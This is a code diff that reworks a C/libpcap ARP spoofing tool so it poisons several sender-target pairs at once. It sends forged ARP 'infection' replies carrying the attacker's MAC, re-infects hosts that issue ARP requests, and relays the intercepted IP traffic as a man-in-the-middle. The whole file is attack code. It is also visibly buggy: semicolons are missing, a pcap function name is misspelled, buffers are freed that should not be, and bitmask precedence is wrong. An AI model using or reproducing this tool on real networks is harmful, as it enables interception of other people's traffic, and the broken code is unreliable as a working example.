@@ -1,156 +1,192 @@
-#include <stdio.h>
-#include <string.h>
-#include <arpa/inet.h>
 #include <pcap.h>
 #include "headers.h"
 #include "initial.h"
 
-
 int main(int argc, char* argv[])
 {
-    if (argc != 4)
-    {
-        printf("USAGE : send_arp <interface> <sender ip> <target ip>\n");
-        return -1;
-    }
+	// for for.
     int i = 0;
-    uint8_t tmp;
-    char* cp = strtok(argv[2], ".");
+    bool flag = false;
+    int tmp;
 
+    //for structure include s_ip, s_mac, t_ip, t_mac.
+    struct session sessions[argc - 2];
+
+    //initialize things need.
     uint8_t attacker_mac[6];
-    uint8_t sender_mac[6];
-    uint8_t sender_ip[4];
-    uint8_t target_ip[4];
-    uint8_t broadcast_mac[6];
-    uint8_t zero_mac[6] = {0,0,0,0,0,0};
-    uint8_t zero_ip[4] = {0,0,0,0};
+    uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+    uint8_t zero_mac[6] = {0, 0, 0, 0, 0, 0};
+    uint32_t zero_ip = 0;
 
+    //for pcap.
     struct pcap_pkthdr* header;
     const u_char* packet;
-    const u_char* infection_packet;
+    const u_char* infection_packet[argc - 2];
     char* buf[256];
     int res;
     char *dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
-
-
-    for(i = 0; cp; i++)
-    {
-        tmp = atoi(cp);
-        sender_ip[i] = tmp;
-        cp = strtok(NULL,".");
-    }
-
-    cp = strtok(argv[3], ".");
-
-    for(i = 0; cp; i++)
-    {
-        tmp = atoi(cp);
-        target_ip[i] = tmp;
-        cp = strtok(NULL,".");
-    }
-    //print IP addresses obtained from arguments, which transformed from string to integer type.
-
-    printf("sender_ip = %d.%d.%d.%d\n",sender_ip[0], sender_ip[1], sender_ip[2], sender_ip[3]);
-    printf("target_ip = %d.%d.%d.%d\n",target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
-
-    // Get local mac address(attacker's mac address) with get_my_mac function which posted on someone's github. thanks :).
-
-    get_my_mac(attacker_mac, argv[1]);
-    printf("my mac = %02x:%02x:%02x:%02x:%02x:%02x\n",attacker_mac[0],attacker_mac[1],attacker_mac[2],attacker_mac[3],attacker_mac[4],attacker_mac[5]);
-
-    //set broadcast_mac
-
-    for(i = 0; i < 6; i++)
-    {
-        broadcast_mac[i] = 0xff;
-    }
-
-    packet = make_arp(REQUEST, attacker_mac, broadcast_mac, attacker_mac, zero_ip, zero_mac, sender_ip);
-
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 
-    if (!handle)
+    if(!handle)
     {
-        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
-        return -1;
+    	fprintf(stderr, "[-] couldn't open device %s: %s\n", dev, errbuf);
+    	return -1;
     }
 
-    pcap_sendpacket(handle, packet, 42);
-    while(true)
+    //retype ip address.
+    for(i = 2; i < argc; i += 2)
     {
-        res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0) continue;
-        if (res == -1 || res == -2) break;
+    	ip_retype(argv[i],sessions[(i / 2) - 1].sender_ip);
+    	ip_retype(argv[i + 1],sessions[(i / 2) - 1].target_ip);
+    	printf("[+] %d : sender ip : %8x\n", i / 2, sessions[((i / 2) - 1)].sender_ip);
+    	printf("[+] %d : target ip : %8x\n", i / 2, sessions[((i / 2) - 1)].target_ip);
+    }
 
-        struct ethernet_hdr* eth= (struct ethernet_hdr*)malloc(14);
-        eth = (struct ethernet_hdr*)packet;
-        struct arp_hdr* arp = (struct arp_hdr*)malloc(28);
-        arp = (struct arp_hdr*)(packet + 14);
-        if(eth->ether_type == 0x0608 && arp->S_protocol_addr[3] == sender_ip[3])
-        {
-            for(i = 0; i < 6; i++)
-            {
-                sender_mac[i] = arp->S_hardware_addr[i];
-                printf("sender_mac set clear\n");
-            }
-            break;
-        }
-        printf("ip add == %d, %d\n",arp->S_protocol_addr[3], sender_ip[3]);
-        printf("type = %04x\nopcode = %d\n",eth->ether_type,arp->Opcode);
+    //get my mac address.
+    get_my_mac(attacker_mac, argv[1]);
+    printf("[+] my mac = %02x:%02x:%02x:%02x:%02x:%02x\n",attacker_mac[0],attacker_mac[1],attacker_mac[2],attacker_mac[3],attacker_mac[4],attacker_mac[5]);
+
+    //get all sessions sender mac address.
+    for(i = 0; i < (argc - 2) / 2; i++)
+    {
+    	packet = make_arp(REQUEST, attacker_mac, broadcast_mac, attacker_mac, zero_ip, zero_mac, sessions[i].sender_ip)
+    	pcap_sendpacket(handle, packet, 42);
+    	while(true)
+    	{
+        	res = pcap_next_ex(handle, &header, &packet);
+        	if (res == 0) continue;
+        	if (res == -1 || res == -2) break;
+
+       	 	struct ethernet_hdr* eth= (struct ethernet_hdr*)malloc(14);
+        	eth = (struct ethernet_hdr*)packet;
+        	struct arp_hdr* arp = (struct arp_hdr*)malloc(28);
+       	 	arp = (struct arp_hdr*)(packet + 14);
+        	if(eth->ether_type == 0x0608 && arp->S_protocol_addr[3] == sessions[i].sender_ip & 0xff)
+        	{
+            	for(int j = 0; j < 6; j++)
+           		{
+                	sessions[i].sender_mac[j] = arp->S_hardware_addr[j];
+                	printf("[+] %d : sender_mac set clear\n", i);
+            	}
+            	break;
+        	}
+       	free(packet);
         free(eth);
         free(arp);
+    	}
     }
 
-    infection_packet = make_arp(REPLY, attacker_mac, sender_mac, attacker_mac, target_ip, sender_mac, sender_ip);
-    pcap_sendpacket(handle, infection_packet, 42);
-    printf("send infection packet!\n");
+    //get all sessions target mac address.
+    for(i = 0; i < (argc - 2) / 2; i++)
+    {
+    	packet = make_arp(REQUEST, attacker_mac, broadcast_mac, attacker_mac, zero_ip, zero_mac, sessions[i].target_ip)
+    	pcap_sendpacket(handle, packet, 42);
+    	while(true)
+    	{
+        	res = pcap_next_ex(handle, &header, &packet);
+        	if (res == 0) continue;
+        	if (res == -1 || res == -2) break;
+
+       	 	struct ethernet_hdr* eth= (struct ethernet_hdr*)malloc(14);
+        	eth = (struct ethernet_hdr*)packet;
+        	struct arp_hdr* arp = (struct arp_hdr*)malloc(28);
+       	 	arp = (struct arp_hdr*)(packet + 14);
+        	if(eth->ether_type == 0x0608 && arp->S_protocol_addr[3] == sessions[i].target_ip & 0xff)
+        	{
+            	for(int j = 0; j < 6; j++)
+           		{
+                	sessions[i].target_mac[j] = arp->S_hardware_addr[j];
+                	printf("[+] %d : target_mac set clear\n", i);
+            	}
+            	break;
+        	}
+        free(packet);
+        free(eth);
+        free(arp);
+    	}
+    }
+
+    for(i = 0; i < (argc - 2) / 2; i++)
+    {
+    	infection_packet[i] = make_arp(REPLY, attacker_mac, sessions[i].sender_mac, attacker_mac, sessions[i].target_ip, sessions[i].sender_mac, sessions[i].sender_ip);
+    	pcap_sendpacket(handle, infection_packet[i], 42);
+    	printf("[+] infection_packet for session no.%d is sendedn", i);
+    }
+
     while(true)
     {
-        res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0) continue;
-        if (res == -1 || res == -2) break;
-        struct ethernet_hdr* eth = (struct ethernet_hdr*)malloc(14);
-        eth = (struct ethernet_hdr*)packet;
-        if(eth->ether_type == 0x0080)
-        {
-            struct ip_hdr* l3_hdr = (struct ip_hdr*)malloc(20);
-            l3_hdr = (struct ip_hdr*)(packet + 14);
+    	res = pcap_net_ex(handle, &header, &packet);
+    	if (res == 0)
+    		continue;
+    	if (res == -1 || res == -2)
+    		break;
 
-            if(l3_hdr->S_ip >> 24 == sender_ip[3])
-            {
-                for(int i = 0; i < 5; i++)
-                {
-                    eth->ether_smac[i] = attacker_mac[i];
-                }
-                pcap_sendpacket(handle, packet, 34);
-            }
-        }
-        else if(eth->ether_type == 0x0608)
-        {
-            struct arp_hdr* l3_hdr = (struct arp_hdr*)malloc(28);
-            l3_hdr = (struct arp_hdr*)(packet + 14);
-            if(!strcmp(l3_hdr -> T_hardware_addr, attacker_mac, 6))
-            {
-                pcap_sendpacket(handle, infection_packet, 42);
-                printf("send infection packet!\n");
-            }
-            }
-        }
-        else
-        {
-            continue;
-        }
+    	struct ethernet_hdr* eth = (struct ethernet_hdr*)malloc(14);
+    	eth = (struct ethernet_hdr*)packet;
 
+    	if(eth -> ether_type == 0x0080)
+    	{
+    		struct ip_hdr* l3_hdr = (struct ip_hdr*)malloc(20);
+    		l3_hdr = (struct ip_hdr*)(packet + 14);
 
+    		flag = false;
+    		for(i = 0; i < (argc - 2) / 2; i++)
+    		{
+    			if(l3_hdr -> S_ip == sessions[i].sender_ip)
+    			{
+    				flag = true;
+    				tmp = i;
+    				break;
+    			}
+    		}
+    		if(flag)
+    		{
+    			for(i = 0; i < 6; i++)
+    			{
+    				eth -> ether_smac[i] = attacker_mac[i];
+    				eth -> ether_dmac[i] = sessions[tmp].target_mac[i];
+    			}
+    		}
+    		pcap_sendpacket(handle, packet, 34);
+    	}
+    	else if(eth -> ether_type == 0x0608)
+    	{
+    		struct arp_hdr* l3_hdr = (struct arp_hdr*)malloc(28);
+    		l3_hdr = (struct arp_hdr*)(packet + 14);
+    		if(!memcmp(l3_hdr -> T_hardware_addr, broadcast_mac, 6))
+    		{
+    			flag = false;
+    			for(i = 0; i < (argc - 2) / 2; i++)
+    			{
+    				if(l3_hdr -> T_protocol_addr[3] == sessions[i].target_ip & 0xff && l3_hdr -> Opcode == REQUEST)
+    				{
+    					flag = true;
+    					tmp = i;
+    					break;
+    				}
+    			}
+    			if(flag)
+    				pcap_sendpacket(handle, infection_packet[tmp], 42);
 
-
-
-        pcap_sendpacket(handle, packet, 42);
-        printf("send infection packet!\n");
+    		}
+    		if(!memcmp(l3_hdr -> T_hardware_addr, attacker_mac, 6))
+    		{
+    			flag = false;
+    			for(i = 0; i < (argc - 2) / 2; i++)
+    			{
+    				if(l3_hdr -> T_protocol_addr[3] == sessions[i].target_ip & 0xff && l3_hdr -> Opcode == REQUEST)
+    				{
+    					flag = true;
+    					tmp = i;
+    					break;
+    				}
+    			}
+    			if(flag)
+    				pcap_sendpacket(handle, infection_packet[tmp], 42);
+    		
+    		}
+    	}
     }
-
-
-
-    return 0;
+	return 0;
 }
